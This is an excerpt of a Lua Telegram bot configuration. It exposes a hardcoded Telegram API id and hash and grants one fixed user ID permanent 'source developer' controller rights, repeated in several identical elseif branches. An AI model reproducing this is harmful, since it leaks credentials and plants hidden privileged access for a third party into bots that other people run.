...
LuaTele = luatele.set_config{api_id=24417943,api_hash='8f8023dbe6965da5ffe851c5f69b2bf5',session_name=Revor,token=Token}
...
ControllerAll = false
local ListSudos ={Sudo_Id,7031471363}  
...
if tonumber(msg.sender.user_id) == 7031471363 then
msg.Name_Controller = 'مطور السورس '
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 7031471363 then
msg.Name_Controller = 'مطور السورس '
msg.The_Controller = 1
elseif tonumber(msg.sender.user_id) == 7031471363 then
